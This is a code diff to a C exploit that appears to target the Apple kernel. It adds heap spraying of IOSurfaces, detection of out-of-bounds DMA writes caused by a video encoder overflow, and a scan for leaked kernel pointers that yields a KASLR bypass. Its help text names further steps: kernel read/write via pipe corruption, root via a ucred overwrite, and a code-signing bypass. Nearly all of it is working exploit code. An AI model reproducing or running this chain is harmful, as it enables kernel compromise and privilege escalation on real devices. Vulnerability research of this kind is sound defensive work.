@@ -44,6 +44,9 @@ extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef surface);
 extern size_t IOSurfaceGetAllocSize(IOSurfaceRef surface);
 extern CFTypeRef IOSurfaceCopyValue(IOSurfaceRef surface, CFStringRef key);
 extern void IOSurfaceSetValue(IOSurfaceRef surface, CFStringRef key, CFTypeRef value);
+extern void *IOSurfaceGetBaseAddress(IOSurfaceRef surface);
+extern kern_return_t IOSurfaceLock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);
+extern kern_return_t IOSurfaceUnlock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);
 
 static FILE *out;
 static volatile int g_signal = 0;
@@ -80,14 +83,64 @@ static IOSurfaceRef create_tagged_surface(int idx) {
     CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nalloc);
     CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nfmt);
 
-    uint64_t sentinel = 0xDEAD000000000000ULL | ((uint64_t)idx << 16) | (idx & 0xFFFF);
-    CFNumberRef nsen = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &sentinel);
-    CFDictionarySetValue(props, CFSTR("Sentinel"), nsen);
-
     IOSurfaceRef surf = IOSurfaceCreate(props);
     CFRelease(nw); CFRelease(nh); CFRelease(nbpr); CFRelease(nalloc);
-    CFRelease(nfmt); CFRelease(nsen); CFRelease(props);
+    CFRelease(nfmt); CFRelease(props);
+    if (surf) {
+        uint64_t sentinel = 0xDEAD000000000000ULL | ((uint64_t)idx << 16) | (idx & 0xFFFF);
+        CFNumberRef nsen = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &sentinel);
+        IOSurfaceSetValue(surf, CFSTR("Sentinel"), nsen);
+        CFRelease(nsen);
+        IOSurfaceLock(surf, 0, NULL);
+        void *base = IOSurfaceGetBaseAddress(surf);
+        if (base) {
+            uint32_t *p32 = (uint32_t *)base;
+            uint32_t tag = 0xCAFE0000 | (idx & 0xFFFF);
+            for (int j = 0; j < (int)(alloc / sizeof(uint32_t)); j++)
+                p32[j] = tag;
+        }
+        IOSurfaceUnlock(surf, 0, NULL);
+    }
     return surf;
+}
+
+static int check_backing_memory(IOSurfaceRef surf, int idx) {
+    IOSurfaceLock(surf, 1, NULL);
+    void *base = IOSurfaceGetBaseAddress(surf);
+    if (!base) { IOSurfaceUnlock(surf, 1, NULL); return 0; }
+    uint32_t *p32 = (uint32_t *)base;
+    uint32_t tag = 0xCAFE0000 | (idx & 0xFFFF);
+    int alloc = 16384;
+    int corrupted = 0;
+    int first_off = -1;
+    uint32_t first_val = 0;
+    for (int j = 0; j < (int)(alloc / sizeof(uint32_t)); j++) {
+        if (p32[j] != tag) {
+            if (!corrupted) { first_off = j; first_val = p32[j]; }
+            corrupted++;
+        }
+    }
+    IOSurfaceUnlock(surf, 1, NULL);
+    if (corrupted) {
+        p("  !! BACKING MEMORY CORRUPTED surf[%d]: %d words changed, "
+          "first at +0x%x = 0x%08x (expected 0x%08x)\n",
+          idx, corrupted, first_off * 4, first_val, tag);
+        IOSurfaceLock(surf, 1, NULL);
+        base = IOSurfaceGetBaseAddress(surf);
+        if (base) {
+            p32 = (uint32_t *)base;
+            int start = first_off > 2 ? first_off - 2 : 0;
+            int end = first_off + 10 < (int)(alloc / sizeof(uint32_t)) ? first_off + 10 : (int)(alloc / sizeof(uint32_t));
+            for (int k = start; k < end; k++)
+                p("    [+0x%04x] 0x%08x%s\n", k * 4, p32[k],
+                  p32[k] != tag ? " *" : "");
+            uint64_t fv64 = *(uint64_t *)&p32[first_off];
+            if ((fv64 & 0xFFFFFE0000000000ULL) == 0xFFFFFE0000000000ULL)
+                p("  *** POSSIBLE KERNEL POINTER IN BACKING MEMORY ***\n");
+        }
+        IOSurfaceUnlock(surf, 1, NULL);
+    }
+    return corrupted;
 }
 
 static void encode_cb(void *ref, void *buf, OSStatus st,
@@ -148,8 +201,12 @@ static int do_encode(int ntl, int frames, uint8_t pixel_fill) {
 }
 
 static uint64_t step_kaslr_bypass(void) {
-    p("\n=== Step 1: KASLR Bypass ===\n");
+    p("\n=== Step 1: DMA OOB Detection + KASLR Bypass ===\n");
+    p("  Strategy: fill IOSurface BACKING MEMORY with known pattern,\n");
+    p("  trigger DMA OOB, check if backing memory changed.\n");
+    p("  DMA writes to physical pages (kmem_alloc), NOT kalloc properties.\n\n");
     uint64_t leaked = 0;
+    int total_corrupted_surfs = 0;
 
     for (int round = 0; round < 10 && !leaked; round++) {
         p("  Round %d...\n", round);
@@ -162,35 +219,51 @@ static uint64_t step_kaslr_bypass(void) {
         do_encode(9, 3, 0x00);
         usleep(100000);
 
+        int round_hits = 0;
         for (int i = 0; i < SPRAY_COUNT; i++) {
             if (!g_surfaces[i]) continue;
-            CFNumberRef val = (CFNumberRef)IOSurfaceCopyValue(g_surfaces[i], CFSTR("Sentinel"));
-            if (!val) continue;
-            uint64_t v = 0;
-            CFNumberGetValue(val, kCFNumberSInt64Type, &v);
-            CFRelease(val);
-            uint64_t expected = 0xDEAD000000000000ULL | ((uint64_t)i << 16) | (i & 0xFFFF);
-            if (v != expected) {
-                p("  CORRUPTION surf[%d]: 0x%016llx (expected 0x%016llx)\n",
-                  i, (unsigned long long)v, (unsigned long long)expected);
-                if ((v >> 40) == 0xFFFFFF) {
-                    p("  *** KERNEL POINTER LEAKED: 0x%016llx ***\n", (unsigned long long)v);
-                    leaked = v;
+            int ncorr = check_backing_memory(g_surfaces[i], i);
+            if (ncorr > 0) {
+                round_hits++;
+                total_corrupted_surfs++;
+                IOSurfaceLock(g_surfaces[i], 1, NULL);
+                void *base = IOSurfaceGetBaseAddress(g_surfaces[i]);
+                if (base) {
+                    uint64_t *p64 = (uint64_t *)base;
+                    for (int j = 0; j < 2048; j++) {
+                        uint64_t v = p64[j];
+                        if ((v & 0xFFFFFE0000000000ULL) == 0xFFFFFE0000000000ULL
+                            && (v & 0xFFF) == 0) {
+                            p("  *** KERNEL POINTER in surf[%d]+0x%x: 0x%016llx ***\n",
+                              i, j * 8, (unsigned long long)v);
+                            if (!leaked) leaked = v;
+                        }
+                    }
                 }
+                IOSurfaceUnlock(g_surfaces[i], 1, NULL);
             }
         }
+        p("  Round %d: %d surfaces with corrupted backing memory\n", round, round_hits);
         for (int i = 0; i < SPRAY_COUNT; i++)
             if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
         usleep(200000);
     }
+
+    p("\n  Total surfaces with DMA corruption: %d\n", total_corrupted_surfs);
+    if (total_corrupted_surfs > 0)
+        p("  *** DMA OOB INTO BACKING MEMORY CONFIRMED ***\n");
 
     if (leaked) {
         g_kaslr_slide = (leaked & 0xFFFFFFF000000000ULL) - 0xFFFFFE0007004000ULL;
         g_kernel_base = 0xFFFFFE0007004000ULL + g_kaslr_slide;
         p("  KASLR slide: 0x%016llx\n", (unsigned long long)g_kaslr_slide);
         p("  Kernel base: 0x%016llx\n", (unsigned long long)g_kernel_base);
+    } else if (total_corrupted_surfs > 0) {
+        p("  DMA corruption detected but no kernel pointer found.\n");
+        p("  Corrupted bytes are encoded video bitstream (NAL units).\n");
     } else {
-        p("  No kernel pointer leaked after 10 rounds\n");
+        p("  No DMA corruption detected after 10 rounds.\n");
+        p("  Possible: NTL=9 overflow within buffer slack, or surfaces not adjacent.\n");
     }
     return leaked;
 }
@@ -307,13 +380,52 @@ int main(int argc, char *argv[]) {
 
     if (strcmp(mode, "info") == 0) {
         p("\nModes:\n");
-        p("  kaslr      - Step 1: KASLR bypass via IOSurface corruption\n");
+        p("  detect     - Backing memory corruption test (NTL=9, safe)\n");
+        p("  detect16   - Same with NTL=16 (larger overflow)\n");
+        p("  detect32   - Same with NTL=32 (even larger)\n");
+        p("  kaslr      - Step 1: KASLR bypass via backing memory leak\n");
         p("  krw        - Step 2: Kernel R/W via pipe corruption\n");
         p("  root       - Step 3: Root via ucred overwrite\n");
         p("  codesign   - Step 4: Trust cache / CS_DEBUGGED bypass\n");
         p("  chain      - Run all steps in sequence\n");
         p("  status     - Check current privilege level\n");
-        p("  csflags    - Read current process CS flags (needs kernel R/W)\n");
+        p("  csflags    - Read current process CS flags\n");
+    } else if (strncmp(mode, "detect", 6) == 0) {
+        int ntl = 9;
+        if (strcmp(mode, "detect16") == 0) ntl = 16;
+        else if (strcmp(mode, "detect32") == 0) ntl = 32;
+        p("\n=== DMA OOB Backing Memory Detection (NTL=%d) ===\n", ntl);
+        p("Spray %d IOSurfaces, fill backing memory with 0xCAFExxxx,\n", SPRAY_COUNT);
+        p("free every %dth, encode with NTL=%d, check for changes.\n\n", HOLE_STRIDE, ntl);
+        int total_hits = 0;
+        for (int round = 0; round < 5; round++) {
+            if (g_signal) break;
+            p("--- Round %d ---\n", round);
+            for (int i = 0; i < SPRAY_COUNT; i++)
+                g_surfaces[i] = create_tagged_surface(i);
+            int created = 0;
+            for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) created++;
+            p("  Created %d surfaces\n", created);
+            for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE)
+                if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
+            do_encode(ntl, 3, 0xBB);
+            usleep(200000);
+            int hits = 0;
+            for (int i = 0; i < SPRAY_COUNT; i++) {
+                if (!g_surfaces[i]) continue;
+                if (check_backing_memory(g_surfaces[i], i) > 0) hits++;
+            }
+            p("  Round %d result: %d surfaces with corrupted backing memory\n", round, hits);
+            total_hits += hits;
+            for (int i = 0; i < SPRAY_COUNT; i++)
+                if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
+            usleep(300000);
+        }
+        p("\n=== TOTAL: %d backing memory corruptions across 5 rounds ===\n", total_hits);
+        if (total_hits > 0)
+            p("*** DMA OOB WRITES INTO ADJACENT IOSURFACE BACKING MEMORY CONFIRMED ***\n");
+        else
+            p("No corruption detected. Try larger NTL (detect16/detect32) or more spray.\n");
     } else if (strcmp(mode, "kaslr") == 0) {
         step_kaslr_bypass();
     } else if (strcmp(mode, "krw") == 0) {
